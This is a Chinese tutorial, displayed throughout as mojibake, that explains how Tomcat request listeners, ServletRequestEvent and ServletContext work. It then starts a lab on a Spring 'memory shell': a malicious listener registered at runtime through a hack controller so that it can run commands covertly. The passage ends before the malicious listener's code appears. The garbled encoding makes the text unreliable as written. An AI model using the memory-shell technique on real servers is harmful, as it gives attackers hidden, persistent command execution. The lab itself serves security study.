çš„æ ‡å‡†ç±»åº“ã€‚ 6 @WebListener è¿™æ˜¯ä¸€ä¸ªâ€œæ ‡ç­¾â€ï¼Œå‘Šè¯‰ Tomcatï¼šâ€œå˜¿ï¼Œæˆ‘æ˜¯ä¸ªç›‘å¬å™¨ï¼Œåˆ«å¿˜äº†æŠŠæˆ‘è£…è¿›å»ï¼â€ ğŸ‘‰ ç›¸å½“äºä½ æŠŠé—¨é“ƒè´´åœ¨é—¨å£ï¼Œç³»ç»Ÿå°±çŸ¥é“â€œè¿™é‡Œæœ‰ç›‘æ§â€ã€‚ 7 public class MyRequestListener implements ServletRequestListener å®šä¹‰ä¸€ä¸ªå« MyRequestListener çš„ç±»ï¼Œå®ƒâ€œæ‰¿è¯ºâ€ä¼šç›‘å¬è¯·æ±‚äº‹ä»¶ã€‚ ğŸ‘‰ å®ç°æ¥å£ = ç­¾åˆåŒï¼šæˆ‘ä¿è¯æä¾› requestInitialized å’Œ requestDestroyed è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚ 10 @Override public void requestInitialized(...) å½“ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼ˆæ¯”å¦‚æ‰“å¼€ç½‘é¡µï¼‰æ—¶ï¼ŒTomcat ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ ğŸ‘‰ å°±åƒé—¨é“ƒæ„Ÿåº”åˆ°äººï¼Œè‡ªåŠ¨â€œå®å’šâ€å“ã€‚ 12 System.out.println(...) æ‰“å°ä¸€æ¡æ—¥å¿—ï¼Œè¡¨ç¤ºâ€œè¯·æ±‚å¼€å§‹äº†â€ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œå†™ä»»ä½•ä½ æƒ³åšçš„äº‹ã€‚ 15-17 event.getServletRequest() ç­‰ æ‹¿åˆ°è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼šè°æ¥çš„ï¼Ÿç”¨ä»€ä¹ˆæ–¹å¼ï¼Ÿè®¿é—®å“ªä¸ªé¡µé¢ï¼Ÿ ğŸ‘‰ å°±åƒä¿å®‰çœ‹ç›‘æ§ï¼šå“¦ï¼Œæ˜¯å¼ ä¸‰ï¼Œä»ä¸œé—¨è¿›æ¥ï¼Œå»äº†è´¢åŠ¡éƒ¨ã€‚ 22 requestDestroyed å½“æœåŠ¡å™¨æŠŠç½‘é¡µå‘å›å»åï¼Œè¿™ä¸ªæ–¹æ³•è¢«è°ƒç”¨ã€‚ ğŸ‘‰ é—¨é“ƒè¯´ï¼šâ€œäººèµ°äº†ï¼Œå…³é—¨ã€‚â€ ğŸ§  åŸç†å›¾è§£ï¼šç›‘å¬å™¨å·¥ä½œæµç¨‹\nç”¨æˆ·æµè§ˆå™¨ â†“ å‘é€ HTTP è¯·æ±‚ï¼ˆæ¯”å¦‚è®¿é—® /index.htmlï¼‰ Tomcat æœåŠ¡å™¨ â†“ åˆ›å»º ServletRequest å¯¹è±¡ï¼ˆä»£è¡¨è¿™æ¬¡è¯·æ±‚ï¼‰ â†“ è§¦å‘äº‹ä»¶ï¼šâ€œè¯·æ±‚å¼€å§‹äº†ï¼â€ â†“ æ‰€æœ‰æ³¨å†Œäº† ServletRequestListener çš„ç›‘å¬å™¨ â†’ è‡ªåŠ¨è°ƒç”¨ .requestInitialized() â†“ Tomcat å¤„ç†è¯·æ±‚ï¼ˆè°ƒç”¨ Servletã€è¿”å›é¡µé¢ï¼‰ â†“ è¯·æ±‚å¤„ç†å®Œæ¯• â†“ è§¦å‘äº‹ä»¶ï¼šâ€œè¯·æ±‚ç»“æŸäº†ï¼â€ â†“ æ‰€æœ‰ç›‘å¬å™¨ â†’ è‡ªåŠ¨è°ƒç”¨ .requestDestroyed() ğŸ‘‰ æ•´ä¸ªè¿‡ç¨‹ä½ ä¸ç”¨æ‰‹åŠ¨è°ƒç”¨ï¼ŒTomcat ä¼šè‡ªåŠ¨è§¦å‘ï¼\nğŸ“¦ å®ƒæ˜¯æ€ä¹ˆè¢«â€œè£…è¿›å»â€çš„ï¼Ÿ\nâ€‹ æˆ‘è§‰å¾—å¾ˆå¿…è¦äº†è§£è¿™ä¸ªæ³¨è§£èƒŒåçš„æ·±æ„ @WebListenerï¼Œ@WebListeneræ˜¯ Servlet å®¹å™¨çš„â€œè½»é‡çº§ IoCâ€ æ§åˆ¶åè½¬ï¼ˆğŸ’¡å®¹å™¨çš„æ¦‚å¿µï¼Œæˆ‘çš„ç†è§£å°±æ˜¯tomcatæå‰å¸®ä½ newå¥½äº†è€Œå·²ï¼Œä½ è‡ªå·±ä¸ç”¨åšnewäº†ï¼Œè€Œä¸”ä»–ä¼šè‡ªåŠ¨ç®¡ç†æ³¨å…¥ä¾èµ–ï¼Œç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œè‡ªåŠ¨å¸®ä½ ç›‘å¬å®ç°è§‚å¯Ÿè€…æ¨¡å¼ï¼Œtomcatä¼šåœ¨æ‰“åŒ…éƒ¨ç½²åç®¡ç†ä¸‰ä¸ªé¡¶çº§å®¹å™¨ï¼‰\nğŸ“Œ æ§åˆ¶æƒä»ä½  â†’ äº¤ç»™ Tomcat â†’ è¿™å°±æ˜¯ æ§åˆ¶åè½¬ï¼ˆInversion of Controlï¼‰\næœ‰ä¸¤ç§æ–¹å¼ï¼š\næ–¹å¼ä¸€ï¼šç”¨æ³¨è§£ @WebListenerï¼ˆæ¨èï¼‰\nåªè¦è¿™ä¸ªç±»åœ¨é¡¹ç›®çš„ src é‡Œï¼Œç¼–è¯‘åæ”¾è¿› WEB-INF/classes Tomcat å¯åŠ¨æ—¶ä¼šæ‰«ææ‰€æœ‰ç±»ï¼Œå‘ç° @WebListenerï¼Œå°±æŠŠå®ƒæ³¨å†Œè¿›ç›‘å¬å™¨åˆ—è¡¨ âœ… ç®€å•æ–¹ä¾¿ï¼Œé€‚åˆå¼€å‘ æ–¹å¼äºŒï¼šå†™ web.xml\ncom.example.MyRequestListener æ˜ç¡®å‘Šè¯‰æœåŠ¡å™¨ï¼šâ€œè¯·åŠ è½½è¿™ä¸ªç›‘å¬å™¨â€ 3.2 æˆ‘çš„ç–‘é—®ï¼šå½¢å‚eventå“ªé‡Œæ¥çš„ public void requestInitialized(ServletRequestEvent event)ï¼Œä¸ºä»€ä¹ˆæˆ‘æ²¡çœ‹åˆ°è°ç»™å®ƒèµ‹å€¼ï¼Œå®ƒå´èƒ½è°ƒç”¨ .getServletRequest()ï¼Ÿ\nè¿™å¥è¯çš„æ„æ€æ˜¯ï¼š\nâ€œå½“ Tomcat è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œ å®ƒä¼šä¼ ç»™æˆ‘ä¸€ä¸ª ç±»å‹ä¸º ServletRequestEvent çš„å¯¹è±¡ï¼Œ æˆ‘æŠŠå®ƒå«åš eventã€‚â€\nServletRequestEvent ç±»é•¿ä»€ä¹ˆæ ·ï¼Ÿï¼ˆJava å®˜æ–¹æºç ç®€åŒ–ç‰ˆï¼‰\npublic class ServletRequestEvent { private ServletRequest request; // é‡Œé¢è£…ç€è¯·æ±‚ // æ„é€ æ–¹æ³•ï¼ˆTomcat è°ƒç”¨ï¼‰ public ServletRequestEvent(ServletContext sc, ServletRequest request) { this.request = request; } // ä½ èƒ½è°ƒçš„æ–¹æ³• public ServletRequest getServletRequest() { return this.request; } public ServletContext getServletContext() { return this.servletContext; } } ä½ å†™çš„æ˜¯ï¼š\nServletRequestEvent event ä½ æ²¡æœ‰å†™ï¼š\nevent = new ServletRequestEvent(...); // ä½ æ²¡åˆ›å»ºï¼ ä½†ä½ èƒ½ç”¨ event.ï¼Œæ˜¯å› ä¸ºï¼š\nTomcat åœ¨è°ƒç”¨ä½ æ–¹æ³•å‰ï¼Œå·å·å¸®ä½  new å¥½äº†ï¼ï¼Œevent æ˜¯ Tomcat è‡ªåŠ¨ä¼ ç»™ä½ çš„ï¼Œä½ ä¸éœ€è¦è‡ªå·±åˆ›å»ºå®ƒã€‚\n// Tomcat èƒŒåœ°é‡Œåšçš„ï¼ˆä½ çœ‹ä¸åˆ°ï¼‰ï¼š ServletRequestEvent event = new ServletRequestEvent(context, request); listener.requestInitialized(event); // ä¼ ç»™ä½  å°±åƒä½ å»é¥­åº—åƒé¥­ï¼ŒæœåŠ¡å‘˜ï¼ˆTomcatï¼‰çœ‹åˆ°æœ‰äººæ¥äº†ï¼ˆè¯·æ±‚åˆ°è¾¾ï¼‰ï¼Œå°±è‡ªåŠ¨å–Šä¸€å£°ï¼š\nâ€œå˜¿ï¼MyRequestListenerï¼Œæœ‰æ–°å®¢äººäº†ï¼è¿™æ˜¯ä»–çš„ä¿¡æ¯ï¼ševentâ€\nä½ åªéœ€è¦å†™å¥½ requestInitialized(event) æ–¹æ³•ï¼ŒTomcat ä¼šåœ¨åˆé€‚çš„æ—¶å€™è°ƒç”¨å®ƒï¼Œå¹¶æŠŠ event å¡è¿›å»ã€‚\nåº•å±‚åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼ˆJVM çº§åˆ«ï¼‰\n// ä½ å†™çš„ public void requestInitialized(ServletRequestEvent event) { event.getServletRequest(); } ç¼–è¯‘åï¼ŒJVM çœ‹åˆ°ï¼š\nâ€œè¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°ï¼Œç±»å‹æ˜¯ ServletRequestEventï¼Œåå­—å« eventâ€\nå½“ Tomcat è°ƒç”¨æ—¶ï¼š\n// Tomcat åšçš„ï¼ˆä¼ªä»£ç ï¼‰ ServletRequestEvent obj = new ServletRequestEvent(...); listener.requestInitialized(obj); // ä¼ è¿›å» éªŒè¯ä¸€ä¸‹ï¼ˆä½ å¯ä»¥è¯•è¯•åŠ è¿™è¡Œï¼‰\nSystem.out.println(\"event å¯¹è±¡æ˜¯: \" + event); è¿è¡Œåä½ ä¼šçœ‹åˆ°ç±»ä¼¼ï¼š\nevent å¯¹è±¡æ˜¯: ServletRequestEvent@12345678 è¯´æ˜å®ƒç¡®å®æ˜¯ä¸€ä¸ªçœŸå®å¯¹è±¡ï¼Œç”± Tomcat æ³¨å…¥ç»™ä½ çš„ã€‚\nä¹±ä¼ ä¸€ä¸ªè¯•è¯•\nå‡è®¾ä½ å†™é”™ï¼š\npublic void requestInitialized(String event) // ç±»å‹é”™äº†ï¼ Tomcat è¯´ï¼š\nâ€œæˆ‘ new çš„æ˜¯ ServletRequestEventï¼Œä½ å´è¦ Stringï¼Ÿ ç±»å‹ä¸åŒ¹é…ï¼ä¸èƒ½ä¼ ï¼â€\nç¼–è¯‘éƒ½è¿‡ä¸äº†ï¼\n**Tomcatï¼**æµç¨‹æ˜¯è¿™æ ·çš„ï¼š\nç”¨æˆ·æµè§ˆå™¨ â†’ å‘é€ HTTP è¯·æ±‚ â†’ Tomcat æ”¶åˆ° â†“ Tomcat å‘ç°ï¼šæœ‰ç›‘å¬å™¨ MyRequestListener â†“ Tomcat åˆ›å»ºä¸€ä¸ª ServletRequestEvent å¯¹è±¡ â†“ Tomcat è°ƒç”¨ï¼šlistener.requestInitialized(event) â†“ ä½ çš„ä»£ç æ‰§è¡Œï¼Œæ‰“å°æ—¥å¿— æœ€åï¼šæ•´ä¸ªé€»è¾‘å›¾\nç”¨æˆ·è¯·æ±‚ â†’ Tomcat æ‹¦æˆª â†’ åˆ›å»º ServletRequestEvent â†“ è‡ªåŠ¨è°ƒç”¨æ‰€æœ‰æ³¨å†Œçš„ ServletRequestListener â†“ ä½ çš„ MyRequestListener.requestInitialized(event) â†“ æ‰“å° IPã€æ–¹æ³•ã€è·¯å¾„... 3.3 æˆ‘çš„ç–‘é—®ï¼šcontextæ˜¯ä»€ä¹ˆ ä¹Ÿæ˜¯jvmä¼ è¿›å»çš„å—ï¼Œè¿™ä¸ªä¸œè¥¿å“ªé‡Œè·å¾—çš„ï¼Ÿ\nServletRequestEvent event = new ServletRequestEvent(context, request); context æ˜¯ä»€ä¹ˆï¼Ÿ å®ƒä¹Ÿæ˜¯ JVM ä¼ çš„å—ï¼Ÿ å®ƒä»å“ªé‡Œæ¥çš„ï¼Ÿ\nä¸€å¥è¯ï¼š\ncontext æ˜¯å½“å‰ Web åº”ç”¨çš„â€œå…¨å±€å¤§è„‘â€ â€”â€” ServletContext å®ƒä¸æ˜¯ JVM ä¼ çš„ï¼Œè€Œæ˜¯ Tomcat åœ¨å¯åŠ¨ä½ çš„ Web åº”ç”¨æ—¶å°±åˆ›å»ºå¥½ï¼Œ ç„¶ååœ¨å¤„ç†æ¯ä¸ªè¯·æ±‚æ—¶ï¼Œè‡ªåŠ¨å¡è¿› ServletRequestEvent çš„æ„é€ æ–¹æ³•é‡Œï¼\næ¯”å–»ï¼š\nè§’è‰² å¯¹åº” Java å¯¹è±¡ å…¬å¸ï¼ˆæ•´ä¸ªç½‘ç«™ï¼‰ ServletContextï¼ˆç®€ç§° contextï¼‰ å‘˜å·¥ï¼ˆæ¯æ¬¡è¯·æ±‚ï¼‰ ServletRequestï¼ˆrequestï¼‰ é€šçŸ¥å•ï¼ˆäº‹ä»¶ï¼‰ ServletRequestEvent å…¬å¸æ˜¯æ€ä¹ˆåˆ›å»ºçš„ï¼Ÿ\nå½“ä½ æŠŠ WAR åŒ…éƒ¨ç½²åˆ° Tomcatï¼š\nTomcat å¯åŠ¨ â†’ åŠ è½½ä½ çš„ webapp â†’ åˆ›å»ºä¸€ä¸ªâ€œå…¬å¸â€å¯¹è±¡ è¿™ä¸ª context ä»£è¡¨ï¼š\nä½ çš„ç½‘ç«™æ ¹è·¯å¾„ web.xml é…ç½® å…¨å±€å‚æ•°ï¼ˆï¼‰ æ‰€æœ‰ Servletã€Listener å…±äº«çš„æ•°æ® æ¯æ¬¡æœ‰äººè®¿é—®ï¼ˆå‘è¯·æ±‚ï¼‰ä¼šæ€æ ·ï¼Ÿ\nç”¨æˆ·å‘è¯·æ±‚ â†’ Tomcat æ”¶åˆ° Tomcat åˆ›å»º ServletRequest request Tomcat æ‹¿å‡ºæ—©å°±åˆ›å»ºå¥½çš„ context æ‰“åŒ…æˆäº‹ä»¶ï¼š ServletRequestEvent event = new ServletRequestEvent(context, request); é€šçŸ¥æ‰€æœ‰ç›‘å¬å™¨ï¼š listener.requestInitialized(event); ```mermaid graph TD A[Tomcat å¯åŠ¨] --\u003e B[åˆ›å»º ServletContext context] B --\u003e C[éƒ¨ç½² Web åº”ç”¨] D[ç”¨æˆ·ç¬¬1æ¬¡è¯·æ±‚] --\u003e E[åˆ›å»º request1] E --\u003e F[ç”¨ context + request1 â†’ new ServletRequestEvent] F --\u003e G[è°ƒç”¨ä½ çš„ listener] H[ç”¨æˆ·ç¬¬2æ¬¡è¯·æ±‚] --\u003e I[åˆ›å»º request2] I --\u003e J[è¿˜æ˜¯ç”¨åŒä¸€ä¸ª context + request2 â†’ new ServletRequestEvent] J --\u003e K[å†æ¬¡è°ƒç”¨ä½ çš„ listener] ``` context æ˜¯å…¨å±€çš„ï¼Œæ°¸è¿œæ˜¯åŒä¸€ä¸ªï¼ request æ˜¯æ¯æ¬¡è¯·æ±‚ä¸€ä¸ªæ–°çš„ï¼\néªŒè¯å®éªŒï¼ˆä½ å¯ä»¥åœ¨ç›‘å¬å™¨é‡Œè¯•è¯•ï¼‰\n@Override public void requestInitialized(ServletRequestEvent event) { ServletContext ctx = event.getServletContext(); System.out.println(\"=== å…¨å±€ä¿¡æ¯ ===\"); System.out.println(\"ç½‘ç«™å: \" + ctx.getContextPath()); System.out.println(\"Servlet ç‰ˆæœ¬: \" + ctx.getMajorVersion() + \".\" + ctx.getMinorVersion()); System.out.println(\"æœåŠ¡å™¨ä¿¡æ¯: \" + ctx.getServerInfo()); è¾“å‡ºç¤ºä¾‹ï¼š\n=== å…¨å±€ä¿¡æ¯ === ç½‘ç«™å: /myapp Servlet ç‰ˆæœ¬: 4.0 æœåŠ¡å™¨ä¿¡æ¯: Apache Tomcat/10.1.28 æ€»ç»“ï¼š\né—®é¢˜ ç­”æ¡ˆ context æ˜¯ä»€ä¹ˆï¼Ÿ å½“å‰ Web åº”ç”¨çš„å…¨å±€ä¸Šä¸‹æ–‡ï¼Œä»£è¡¨æ•´ä¸ªç½‘ç«™ æ˜¯ JVM ä¼ çš„å—ï¼Ÿ ä¸æ˜¯ï¼Œæ˜¯ Tomcat åœ¨éƒ¨ç½²åº”ç”¨æ—¶åˆ›å»º å®ƒä»å“ªé‡Œè·å¾—ï¼Ÿ Tomcat å¯åŠ¨æ—¶ï¼Œæ ¹æ® web.xml å’Œ WAR åŒ…åˆ›å»º æ¯ä¸ªè¯·æ±‚éƒ½ä¸€æ ·å—ï¼Ÿ æ˜¯çš„ï¼æ‰€æœ‰è¯·æ±‚å…±äº«åŒä¸€ä¸ª context æˆ‘èƒ½ç”¨å®ƒå¹²å˜›ï¼Ÿ è¯»å…¨å±€é…ç½®ã€å­˜å…±äº«æ•°æ®ã€è·å–çœŸå®è·¯å¾„ç­‰ contextå±‚çº§\t(ä½œç”¨åŸŸ) contextæ˜¯æœ€é¡¶çº§çš„å—ï¼Ÿä»€ä¹ˆéƒ½æœ‰å—ï¼Ÿ\né—®é¢˜ ç­”æ¡ˆ context æ˜¯æœ€é¡¶çº§çš„å—ï¼Ÿ ä¸æ˜¯ï¼å®ƒåªæ˜¯â€œWeb åº”ç”¨çº§åˆ«â€çš„é¡¶çº§ context ä»€ä¹ˆéƒ½æœ‰å—ï¼Ÿ ä¸æ˜¯ï¼å®ƒåªç®¡â€œå…¨å±€â€çš„äº‹ï¼Œä¸åŒ…å«æ¯æ¬¡è¯·æ±‚çš„æ•°æ® Servlet ä¸‰å¤§ä½œç”¨åŸŸï¼ˆå±‚çº§ç»“æ„ï¼‰â€”â€” è¶…çº§æ¸…æ™°å›¾è§£\n```mermaid graph TD A[Tomcat æœåŠ¡å™¨] --\u003e B[å¤šä¸ª Web åº”ç”¨] B --\u003e C[Web åº”ç”¨ 1 - ServletContext] B --\u003e D[Web åº”ç”¨ 2 - ServletContext] C --\u003e E[å¤šä¸ªç”¨æˆ·ä¼šè¯ - HttpSession] C --\u003e F[å¤šä¸ªè¯·æ±‚ - ServletRequest] E --\u003e G[Session çº§åˆ«æ•°æ®] F --\u003e H[Request çº§åˆ«æ•°æ®] ``` ä¸‰å¤§ä½œç”¨åŸŸå¯¹æ¯”è¡¨ï¼ˆè®°ä½è¿™ä¸ªå°±å¤Ÿäº†ï¼ï¼‰\nå±‚çº§ å¯¹è±¡ ç”Ÿå‘½å‘¨æœŸ èƒ½å­˜ä»€ä¹ˆ å…±äº«èŒƒå›´ æœ€é¡¶çº§ Tomcat å®¹å™¨ å¯åŠ¨ â†’ å…³é—­ å¤šä¸ª Web åº”ç”¨ æ•´ä¸ªæœåŠ¡å™¨ Web åº”ç”¨çº§ ServletContext éƒ¨ç½² â†’ å¸è½½ å…¨å±€é…ç½®ã€å…±äº«æ•°æ® ä¸€ä¸ª Web åº”ç”¨å†…æ‰€æœ‰ç”¨æˆ· ä¼šè¯çº§ HttpSession ç”¨æˆ·ç™»å½• â†’ è¶…æ—¶/é€€å‡º ç”¨æˆ·ä¸“å±æ•°æ®ï¼ˆå¦‚ç™»å½•ä¿¡æ¯ï¼‰ ä¸€ä¸ªç”¨æˆ·çš„æ‰€æœ‰è¯·æ±‚ è¯·æ±‚çº§ ServletRequest è¯·æ±‚å¼€å§‹ â†’ å“åº”ç»“æŸ å½“å‰è¯·æ±‚å‚æ•°ã€ä¸´æ—¶æ•°æ® å•æ¬¡è¯·æ±‚ ServletContextï¼ˆå°±æ˜¯ contextï¼‰åˆ°åº•ç®¡ä»€ä¹ˆï¼Ÿ\nå¯ä»¥åš ä¸å¯ä»¥åš è¯» web.xml é‡Œçš„ å­˜å½“å‰ç”¨æˆ·çš„ç™»å½•å å­˜æ‰€æœ‰ç”¨æˆ·å…±äº«çš„æ•°æ®ï¼ˆå¦‚åœ¨çº¿äººæ•°ï¼‰ å­˜å½“å‰è¯·æ±‚çš„è¡¨å•æ•°æ® è·å–é¡¹ç›®çœŸå®è·¯å¾„ï¼ˆå¦‚ /var/www/uploadï¼‰ è·å–å½“å‰è¯·æ±‚çš„ IPï¼ˆè¦ç”¨ requestï¼‰ è½¬å‘è¯·æ±‚åˆ°å…¶ä»– Servlet çŸ¥é“ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼ˆè¦ç”¨ sessionï¼‰ 3.4 æˆ‘çš„ç–‘é—®ï¼šrequestæ˜¯ä»€ä¹ˆåˆ›å»ºçš„ ä½ çš„é—®é¢˜ï¼ˆç²¾ç‚¼ï¼‰ï¼š\nrequest æ˜¯ä»€ä¹ˆæ—¶å€™åˆ›å»ºçš„ï¼Ÿ è°åˆ›å»ºçš„ï¼Ÿ æ€ä¹ˆä¼ ç»™ ServletRequestEvent çš„ï¼Ÿ\nä¸€å¥è¯ï¼š\nrequest æ˜¯ç”± *Tomcat çš„ Connector æ¨¡å—* åœ¨ *æ¥æ”¶åˆ° TCP è¿æ¥å¹¶è§£æå®Œ HTTP åè®®å* åˆ›å»ºçš„ï¼Œ ç„¶ååœ¨ *è¯·æ±‚è¿›å…¥ Servlet å®¹å™¨å‰* å°±åŒ…è£…å¥½ï¼Œ å†ä¼ ç»™ ServletRequestEvent æ„é€ æ–¹æ³•ï¼Œæœ€ç»ˆé€åˆ°ä½ çš„ç›‘å¬å™¨ï¼\n```mermaid sequenceDiagram participant æµè§ˆå™¨ participant Tomcat_Connector participant Tomcat_Container participant ä½ çš„Listener æµè§ˆå™¨-\u003e\u003eTomcat_Connector: å‘é€ HTTP è¯·æ±‚ (TCP) Tomcat_Connector-\u003e\u003eTomcat_Connector: 1. å»ºç«‹è¿æ¥ + è§£æåè®® Tomcat_Connector-\u003e\u003eTomcat_Connector: 2. åˆ›å»º request å¯¹è±¡ (CoyoteRequest) Tomcat_Connector-\u003e\u003eTomcat_Container: 3. ä¼ é€’ request ç»™å®¹å™¨ Tomcat_Container-\u003e\u003eTomcat_Container: 4. åŒ…è£…æˆ ServletRequest Tomcat_Container-\u003e\u003eTomcat_Container: 5. åˆ›å»º ServletRequestEvent(context, request) Tomcat_Container-\u003e\u003eä½ çš„Listener: 6. è°ƒç”¨ requestInitialized(event) ä½ çš„Listener-\u003e\u003eä½ çš„Listener: 7. ä½¿ç”¨ event.getServletRequest() ``` ä¸€æ­¥æ­¥æ‹†è§£ï¼ˆè°ã€åœ¨å“ªã€ä»€ä¹ˆæ—¶å€™ï¼‰\næ­¥éª¤ è°å¹²çš„ ä»€ä¹ˆæ—¶å€™ åšäº†ä»€ä¹ˆ 1 Tomcat Connector æµè§ˆå™¨å‘è¯·æ±‚ â†’ TCP è¿æ¥å»ºç«‹ æ¥æ”¶å­—èŠ‚æµï¼Œè§£æ HTTP åè®®ï¼ˆå¤´ã€bodyï¼‰ 2 Tomcat Connector è§£æå®Œ HTTP å¤´ åˆ›å»º org.apache.coyote.Request å¯¹è±¡ï¼ˆåŸå§‹è¯·æ±‚ï¼‰ 3 Tomcat Container Connector â†’ Container ç§»äº¤ æŠŠ coyote.Request åŒ…è£…æˆ ServletRequest 4 Tomcat Container è¿›å…¥ Servlet å®¹å™¨å‰ åˆ›å»º ServletRequestEvent(context, request) 5 Tomcat Container è°ƒç”¨ç›‘å¬å™¨æ—¶ æŠŠ event ä¼ ç»™ä½ çš„ requestInitialized(event) æ¯ä¸ªç»†èŠ‚\né—®é¢˜ ç­”æ¡ˆ request ä»€ä¹ˆæ—¶å€™åˆ›å»ºï¼Ÿ HTTP åè®®è§£æå®Œï¼Œè¿›å…¥ Servlet å®¹å™¨å‰ è°åˆ›å»ºçš„ï¼Ÿ Tomcat çš„ Connector â†’ Container åä½œåˆ›å»º è°ä¼ ç»™ ServletRequestEventï¼Ÿ Tomcat Container åœ¨è§¦å‘äº‹ä»¶æ—¶ä¼  æˆ‘èƒ½æ‹¿åˆ°åŸå§‹ coyote.Request å—ï¼Ÿ ä¸€èˆ¬ä¸èƒ½ï¼Œåªæš´éœ²æ ‡å‡† ServletRequest å››ã€ Springå†…å­˜é©¬(ç›‘å¬å™¨) âœ… ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºä¸€ä¸ªç®€å•çš„ Spring Boot Web é¡¹ç›®ï¼ˆæ¨¡æ‹ŸçœŸå®ç¯å¢ƒï¼‰\nâœ… ç¬¬äºŒæ­¥ï¼šå†™ä¸€ä¸ªæ­£å¸¸çš„ HTTP è¯·æ±‚ç›‘å¬å™¨ï¼Œå¹¶è¿è¡Œçœ‹æ•ˆæœ\nâœ… ç¬¬ä¸‰æ­¥ï¼šæ¨¡æ‹Ÿâ€œå†…å­˜é©¬â€æ³¨å…¥ â€”â€” åœ¨è¿è¡Œæ—¶åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„ç›‘å¬å™¨\nâœ… ç¬¬å››æ­¥ï¼šéªŒè¯å®ƒæ˜¯å¦çœŸçš„èƒ½â€œå·å·æ‰§è¡Œå‘½ä»¤â€\n4.1 åˆ›å»º Spring Boot é¡¹ç›®ï¼ˆåŸºç¡€æ¡†æ¶ï¼‰** ğŸ“ é¡¹ç›®ç»“æ„ï¼ˆæœ€ç»ˆé•¿è¿™æ ·ï¼‰\nmy-listener-demo/ â”œâ”€â”€ src/ â”‚ â”œâ”€â”€ main/ â”‚ â”‚ â”œâ”€â”€ java/com/example/demo/ â”‚ â”‚ â”‚ â”œâ”€â”€ DemoApplication.java â† ä¸»ç¨‹åº â”‚ â”‚ â”‚ â”œâ”€â”€ NormalListener.java â† æ­£å¸¸ç›‘å¬å™¨ â”‚ â”‚ â”‚ â”œâ”€â”€ MaliciousListener.java â† æ¨¡æ‹Ÿæ¶æ„ç›‘å¬å™¨ï¼ˆå†…å­˜é©¬ï¼‰ â”‚ â”‚ â”‚ â””â”€â”€ HackController.java â† é»‘å®¢ç”¨æ¥â€œæ³¨å…¥â€çš„å…¥å£ â”‚ â”‚ â””â”€â”€ resources/ â”‚ â”‚ â””â”€â”€ application.properties â”œâ”€â”€ pom.xml ğŸ“„ pom.xml â€”â€” é¡¹ç›®çš„â€œé…æ–™è¡¨â€\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e 4.0.0 com.example my-listener-demo 1.0.0 jar org.springframework.boot spring-boot-starter-parent 2.7.0 org.springframework.boot spring-boot-starter-web org.springframework.boot spring-boot-maven-plugin ğŸ“„ DemoApplication.java â€”â€” ä¸»ç¨‹åºå…¥å£\npackage com.example.demo; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; // æ ‡è®°è¿™æ˜¯ä¸€ä¸ª Spring Boot åº”ç”¨ @SpringBootApplication public class DemoApplication { public static void main(String[] args) { // å¯åŠ¨å†…ç½® Tomcatï¼ŒåŠ è½½æ‰€æœ‰ç»„ä»¶ SpringApplication.run(DemoApplication.class, args); } } ğŸ” é€è¡Œè§£é‡Šï¼š\nè¡Œ è§£é‡Š @SpringBootApplication æœ€é‡è¦çš„æ³¨è§£ï¼å‘Šè¯‰ Springï¼š â€œæˆ‘è¦å¯åŠ¨ä¸€ä¸ª Web åº”ç”¨ï¼Œè¯·è‡ªåŠ¨æ‰«ææ‰€æœ‰ç±»â€ SpringApplication.run(...) å¯åŠ¨ Spring å®¹å™¨å’Œå†…åµŒ Tomcat ğŸ‘‰ æ­¤æ—¶ä¼šæ‰«æ @WebListener å¹¶æ³¨å†Œç›‘å¬å™¨ ğŸ“„ NormalListener.java â€”â€” æ­£å¸¸çš„è¯·æ±‚ç›‘å¬å™¨\npackage com.example.demo; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; import javax.servlet.annotation.WebListener; // å‘Šè¯‰ Tomcatï¼šè¿™æ˜¯ä¸€ä¸ªç›‘å¬å™¨ï¼Œè¯·è‡ªåŠ¨æ³¨å†Œ @WebListener public class NormalListener implements ServletRequestListener { // å½“è¯·æ±‚å¼€å§‹æ—¶è‡ªåŠ¨è°ƒç”¨ @Override public void requestInitialized(ServletRequestEvent sre) { System.out.println(\"ğŸŸ¢ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚å¼€å§‹äº†ï¼æœ‰äººè®¿é—®äº†ï¼\"); } // å½“è¯·æ±‚ç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨ @Override public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\"ğŸ”´ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚ç»“æŸäº†ï¼\"); } } ğŸ” é€è¡Œè§£é‡Šï¼š\nè¡Œ è§£é‡Š @WebListener Tomcat å¯åŠ¨æ—¶ä¼šå‘ç°å®ƒï¼Œå¹¶åŠ å…¥ç›‘å¬å™¨åˆ—è¡¨ implements ServletRequestListener å®ç°æ¥å£ï¼Œæ‰¿è¯ºæä¾›ä¸¤ä¸ªæ–¹æ³• requestInitialized æ¯æ¬¡ HTTP è¯·æ±‚è¿›æ¥ï¼Œè‡ªåŠ¨æ‰“å°â€œè¯·æ±‚å¼€å§‹äº†â€ requestDestroyed æ¯æ¬¡å“åº”å‘å›å»åï¼Œæ‰“å°â€œè¯·æ±‚ç»“æŸäº†â€ ğŸ‘‰ è¿™ä¸ªç›‘å¬å™¨åœ¨ åº”ç”¨å¯åŠ¨æ—¶ å°±è¢«æ³¨å†Œè¿›å»äº†ï¼Œæ˜¯â€œæ˜é¢ä¸Šçš„â€ã€‚\nğŸ“„ MaliciousListener.java â€”â€” æ¨¡æ‹Ÿâ€œå†…å­˜é©¬â€ç›‘å¬å™¨\npackage com.example.demo; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; // 